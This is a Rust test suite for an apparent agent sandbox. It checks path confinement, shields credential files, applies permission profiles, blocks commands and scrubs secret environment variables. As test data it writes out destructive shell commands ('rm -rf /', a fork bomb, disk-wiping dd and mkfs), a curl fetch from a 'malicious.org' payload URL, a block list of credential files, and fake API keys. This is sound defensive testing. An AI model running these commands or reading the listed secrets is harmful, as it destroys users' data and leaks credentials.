//! Exhaustive security and confinement integration test suite for `kai-sandbox`.
//!
//! Verifies path traversal prevention, symlink containment, sensitive credential shielding,
//! permission matrix enforcement, destructive command detection, and environment scrubbing.

use std::path::Path;

use kai_core::error::SandboxError;
use kai_core::traits::{PermissionCategory, SandboxPolicy};
use kai_sandbox::{
    AccessDecision, CommandSanitizer, PathResolver, PermissionMatrix, StandardSandboxPolicy,
};

#[test]
fn test_path_resolver_confinement_and_traversal_rejection() {
    let tmp_root = std::env::temp_dir().join(format!("kai_test_sandbox_{}", std::process::id()));
    let inner_dir = tmp_root.join("workspace");
    std::fs::create_dir_all(&inner_dir).unwrap();

    let resolver = PathResolver::new(&inner_dir).unwrap();

    // 1. Valid paths within workspace
    let valid_rel = Path::new("src/main.rs");
    let canonical = resolver.canonicalize_path(valid_rel).unwrap();
    assert!(canonical.starts_with(resolver.workspace_root()));

    // 2. Directory traversal via `..` escaping root
    let traversal_rel = Path::new("../escaped.txt");
    let err = resolver.canonicalize_path(traversal_rel).unwrap_err();
    assert!(matches!(err, SandboxError::PathTraversalDetected { .. }));

    // 3. Absolute path escaping root
    let system_dir = if cfg!(windows) {
        Path::new(r"C:\Windows")
    } else {
        Path::new("/etc")
    };
    let abs_err = resolver.canonicalize_path(system_dir).unwrap_err();
    assert!(matches!(
        abs_err,
        SandboxError::PathTraversalDetected { .. }
    ));

    // 4. Null byte injection
    let null_byte_path = Path::new("sub\0dir/evil.txt");
    let null_err = resolver.canonicalize_path(null_byte_path).unwrap_err();
    assert!(matches!(
        null_err,
        SandboxError::PathTraversalDetected { .. }
    ));

    let _ = std::fs::remove_dir_all(&tmp_root);
}

#[test]
fn test_path_resolver_nonexistent_file_resolution() {
    let tmp_root =
        std::env::temp_dir().join(format!("kai_test_sandbox_nonexist_{}", std::process::id()));
    let inner_dir = tmp_root.join("project");
    std::fs::create_dir_all(&inner_dir).unwrap();

    let resolver = PathResolver::new(&inner_dir).unwrap();

    // Non-existent target file in existing directory
    let target = inner_dir.join("src").join("new_module.rs");
    let resolved = resolver.canonicalize_path(&target).unwrap();
    assert!(resolved.starts_with(resolver.workspace_root()));
    assert!(resolved.ends_with(Path::new("src").join("new_module.rs")));

    // Non-existent target escaping workspace via relative traversal
    let escape = inner_dir.join("..").join("outside.txt");
    let escape_err = resolver.canonicalize_path(&escape).unwrap_err();
    assert!(matches!(
        escape_err,
        SandboxError::PathTraversalDetected { .. }
    ));

    let _ = std::fs::remove_dir_all(&tmp_root);
}

#[test]
fn test_protected_resource_shield_blocks_credentials_and_secrets() {
    let tmp_root =
        std::env::temp_dir().join(format!("kai_test_sandbox_shield_{}", std::process::id()));
    std::fs::create_dir_all(&tmp_root).unwrap();

    let resolver = PathResolver::new(&tmp_root).unwrap();

    // List of forbidden credential and secret files
    let protected_files = [
        ".env",
        ".env.local",
        ".env.production",
        "id_rsa",
        "id_ed25519",
        "server.key",
        "certificate.pem",
        "keystore.p12",
        "credentials.json",
        "credentials",
        "secrets.yaml",
        "secrets.json",
        "token.json",
        "auth.token",
        ".netrc",
        ".npmrc",
    ];

    for file in protected_files {
        let path = tmp_root.join(file);
        let err = resolver.canonicalize_path(&path).unwrap_err();
        assert!(
            matches!(err, SandboxError::ProtectedResourceAccess { .. }),
            "File '{file}' should have been blocked as a protected resource"
        );
    }

    // Harmless files must NOT be blocked
    let safe_files = ["Cargo.toml", "main.rs", "README.md", "app.env.config.js"];
    for file in safe_files {
        let path = tmp_root.join(file);
        assert!(
            resolver.canonicalize_path(&path).is_ok(),
            "File '{file}' should be allowed"
        );
    }

    let _ = std::fs::remove_dir_all(&tmp_root);
}

#[test]
fn test_permission_matrix_profiles_and_decisions() {
    // 1. Strict profile
    let strict = PermissionMatrix::strict();
    assert_eq!(
        strict.decision(PermissionCategory::FileRead),
        AccessDecision::Allow
    );
    assert_eq!(
        strict.decision(PermissionCategory::FileWrite),
        AccessDecision::Deny
    );
    assert_eq!(
        strict.decision(PermissionCategory::ShellExecution),
        AccessDecision::Deny
    );
    assert_eq!(
        strict.decision(PermissionCategory::NetworkAccess),
        AccessDecision::Deny
    );
    assert_eq!(
        strict.decision(PermissionCategory::BrowserControl),
        AccessDecision::Deny
    );
    assert!(strict
        .check_permission(PermissionCategory::FileWrite)
        .is_err());

    // 2. Standard profile
    let mut standard = PermissionMatrix::standard();
    assert!(standard.is_allowed(PermissionCategory::FileRead));
    assert!(standard.is_allowed(PermissionCategory::FileWrite));
    assert!(standard.is_allowed(PermissionCategory::ShellExecution));
    assert!(!standard.is_allowed(PermissionCategory::NetworkAccess));

    // Dynamic capability grant and revocation
    standard.allow(PermissionCategory::NetworkAccess);
    assert!(standard.is_allowed(PermissionCategory::NetworkAccess));
    assert!(standard
        .check_permission(PermissionCategory::NetworkAccess)
        .is_ok());

    standard.deny(PermissionCategory::ShellExecution);
    assert!(!standard.is_allowed(PermissionCategory::ShellExecution));
    assert!(standard
        .check_permission(PermissionCategory::ShellExecution)
        .is_err());

    // 3. Permissive profile
    let permissive = PermissionMatrix::permissive();
    assert!(permissive.is_allowed(PermissionCategory::FileRead));
    assert!(permissive.is_allowed(PermissionCategory::FileWrite));
    assert!(permissive.is_allowed(PermissionCategory::ShellExecution));
    assert!(permissive.is_allowed(PermissionCategory::NetworkAccess));
    assert!(permissive.is_allowed(PermissionCategory::BrowserControl));
}

#[test]
fn test_command_sanitizer_destructive_and_interactive_checks() {
    let sanitizer = CommandSanitizer::new();

    // 1. Destructive commands must be blocked
    let destructive_commands = [
        "rm -rf /",
        "rm -fr /",
        "rm -rf /*",
        ":(){ :|:& };:",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "shutdown -h now",
        "init 0",
    ];

    for cmd in destructive_commands {
        let err = sanitizer.validate_command(cmd).unwrap_err();
        assert!(
            matches!(err, SandboxError::PermissionDenied { .. }),
            "Destructive command '{cmd}' must be blocked"
        );
    }

    // 2. Interactive STDIN blocking commands
    assert!(sanitizer.validate_command("sudo apt update").is_err());
    assert!(sanitizer.validate_command("su - root").is_err());
    assert!(sanitizer.validate_command("passwd user").is_err());
    assert!(sanitizer.validate_command("apt-get install nginx").is_err());

    // 3. Safe non-interactive commands must pass
    assert!(sanitizer
        .validate_command("cargo check --workspace")
        .is_ok());
    assert!(sanitizer.validate_command("git status").is_ok());
    assert!(sanitizer
        .validate_command("apt-get install -y nginx")
        .is_ok());
    assert!(sanitizer.validate_command("npm run build").is_ok());

    // 4. Custom blocked patterns
    let custom = sanitizer.with_blocked_pattern("curl http://malicious.org");
    assert!(custom
        .validate_command("curl http://malicious.org/payload")
        .is_err());
    assert!(custom.validate_command("curl http://safe.org").is_ok());
}

#[test]
fn test_command_sanitizer_environment_variable_scrubbing() {
    let dirty_env = vec![
        ("PATH", "/usr/bin:/bin"),
        ("HOME", "/home/user"),
        ("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE"),
        ("GITHUB_TOKEN", "ghp_secrettoken123456"),
        ("OPENAI_API_KEY", "sk-1234567890abcdef"),
        ("DATABASE_URL", "postgres://user:secret@localhost/db"),
        ("DB_PASSWORD", "super_secret_pw"),
        ("RUST_LOG", "info"),
        ("USER_API_KEY", "key_9999"),
    ];

    let clean_env = CommandSanitizer::scrub_env(dirty_env);
    let keys: Vec<String> = clean_env.into_iter().map(|(k, _)| k).collect();

    assert!(keys.contains(&"PATH".to_string()));
    assert!(keys.contains(&"HOME".to_string()));
    assert!(keys.contains(&"RUST_LOG".to_string()));

    // Verify all sensitive keys are completely scrubbed
    assert!(!keys.contains(&"AWS_SECRET_ACCESS_KEY".to_string()));
    assert!(!keys.contains(&"GITHUB_TOKEN".to_string()));
    assert!(!keys.contains(&"OPENAI_API_KEY".to_string()));
    assert!(!keys.contains(&"DATABASE_URL".to_string()));
    assert!(!keys.contains(&"DB_PASSWORD".to_string()));
    assert!(!keys.contains(&"USER_API_KEY".to_string()));
}

#[test]
fn test_standard_sandbox_policy_integration() {
    let tmp_root =
        std::env::temp_dir().join(format!("kai_test_sandbox_policy_{}", std::process::id()));
    let workspace = tmp_root.join("app");
    let extra_scratch = tmp_root.join("scratch");
    std::fs::create_dir_all(&workspace).unwrap();
    std::fs::create_dir_all(&extra_scratch).unwrap();

    let policy = StandardSandboxPolicy::builder(&workspace)
        .with_allowed_root(&extra_scratch)
        .with_permission_matrix(PermissionMatrix::standard())
        .with_blocked_command_pattern("danger_script.sh")
        .build()
        .unwrap();

    // 1. SandboxPolicy trait canonicalize_path
    let workspace_file = workspace.join("src").join("lib.rs");
    let canon = policy.canonicalize_path(&workspace_file).unwrap();
    assert!(canon.starts_with(policy.path_resolver().workspace_root()));

    let scratch_file = extra_scratch.join("temp_data.bin");
    let scratch_canon = policy.canonicalize_path(&scratch_file).unwrap();
    assert!(scratch_canon.starts_with(policy.path_resolver().allowed_roots()[0].as_path()));

    // 2. Trait check_permission
    assert!(policy
        .check_permission(PermissionCategory::FileRead)
        .is_ok());
    assert!(policy
        .check_permission(PermissionCategory::FileWrite)
        .is_ok());
    assert!(policy
        .check_permission(PermissionCategory::ShellExecution)
        .is_ok());
    assert!(policy
        .check_permission(PermissionCategory::NetworkAccess)
        .is_err());

    // 3. validate_execution
    assert!(policy.validate_execution("cargo build --release").is_ok());
    assert!(policy.validate_execution("rm -rf /").is_err());
    assert!(policy.validate_execution("sh danger_script.sh").is_err());

    let _ = std::fs::remove_dir_all(&tmp_root);
}
